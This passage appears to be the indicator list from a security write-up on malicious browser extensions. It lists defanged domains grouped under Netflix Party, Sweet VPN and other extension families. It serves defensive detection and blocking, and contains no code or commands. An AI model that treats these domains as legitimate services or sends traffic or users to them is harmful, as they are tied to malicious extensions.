-   get-any-manual\[.\]pro
-   get-manual\[.\]info
-   getresult\[.\]guru
-   good-ship\[.\]com
-   gulkayak\[.\]com
-   isstillalive\[.\]com
-   kralforum\[.\]com\[.\]tr
-   locodata\[.\]site
-   lottingem\[.\]com
-   manual-finder\[.\]site
-   manuals-viewer\[.\]info
-   megaboost\[.\]site
-   nocodata\[.\]online
-   ntdataview\[.\]online
-   picky-ext\[.\]pro
-   pocodata\[.\]pro
-   readtxt\[.\]pro
-   rumorpix\[.\]com
-   screencapx\[.\]co
-   searchglobal\[.\]online
-   search-protection\[.\]org
-   searchresultspage\[.\]online
-   shurkul\[.\]online
-   skipadsplus\[.\]online
-   skip-all-ads\[.\]info
-   skip-n-watch\[.\]info
-   skippy\[.\]pro
-   smartsearch\[.\]guru
-   smartsearch\[.\]top
-   socialtab\[.\]top
-   soundbooster\[.\]online
-   speechit\[.\]pro
-   super-sound-booster\[.\]info
-   tabmemoptimizer\[.\]site
-   taboptimizer\[.\]com
-   text-speecher\[.\]online
-   topodat\[.\]info
-   triplestat\[.\]online
-   true-sound-booster\[.\]online
-   ufind\[.\]site
-   video-downloader-click-save\[.\]online
-   video-downloader-plus\[.\]info
-   vipoisk\[.\]ru
-   vipsearch\[.\]guru
-   vipsearch\[.\]top
-   voicereader\[.\]online
-   websiteconf\[.\]online
-   youtube-ads-skip\[.\]site
-   ystatic\[.\]site

The following domain names are used by Netflix Party and related extensions:

-   abforbrowser\[.\]com
-   autorefresh\[.\]co
-   autorefreshplus\[.\]in
-   getmatchingcouponsanddeals\[.\]info
-   pipextension\[.\]com
-   smartadblocker\[.\]com
-   telenetflixparty\[.\]com
-   ytadblock\[.\]com
-   ytadskip\[.\]com

The following domain names are used by Sweet VPN and related extensions:

-   analyticsbatch\[.\]com
-   aquafreevpn\[.\]com
-   batchindex\[.\]com
-   browserdatahub\[.\]com
-   browserlisting\[.\]com
-   checkbrowserer\[.\]com
-   countstatistic\[.\]com
-   estimatestatistic\[.\]com
-   metricbashboard\[.\]com
-   proxy-config\[.\]com
-   qippin\[.\]com
-   realtimestatistic\[.\]com
-   secondstatistic\[.\]com
-   securemastervpn\[.\]com
-   shceduleuser\[.\]com
-   statisticindex\[.\]com
-   sweet-vpn\[.\]com
-   timeinspection\[.\]com
-   traficmetrics\[.\]com
-   trafficreqort\[.\]com
-   ultimeo-downloader\[.\]com
-   unbansocial\[.\]com
-   userestimate\[.\]com
-   virtualstatist\[.\]com
-   webstatscheck\[.\]com

These domain names are used by the extensions in the bonus section:

-   adblock-360\[.\]com
-   easynav\[.\]net
-   internetdownloadmanager\[.\]top
-   privacy-bear\[.\]net
-   skipads-ytb\[.\]com
-   translatories\[.\]com

## Curator notes

<!-- Empty at capture time. -->
